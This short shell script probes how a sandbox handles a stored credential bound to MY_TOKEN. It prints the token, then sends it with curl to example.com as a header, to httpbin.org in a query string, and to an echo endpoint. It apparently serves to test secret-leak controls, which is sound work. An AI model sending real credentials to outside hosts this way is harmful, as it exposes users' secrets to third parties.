# probe3.sh: runs inside the sandbox with MY_TOKEN bound to a stored credential. Shows what the variable holds,
# then tries to use it on an untrusted domain, in a query string, and on a trusted domain that echoes requests.
echo "inside: MY_TOKEN=$MY_TOKEN"
echo "untrusted domain: $(curl -s -m 10 https://example.com -H "X-Api-Key: $MY_TOKEN" | head -c 110)"
echo "query string:     $(curl -s -m 10 "https://httpbin.org/get?k=$MY_TOKEN" | head -c 85)"
echo "trusted echo:     $(curl -s -m 10 https://httpbin.org/headers -H "X-Api-Key: $MY_TOKEN" | grep -i x-api-key)"
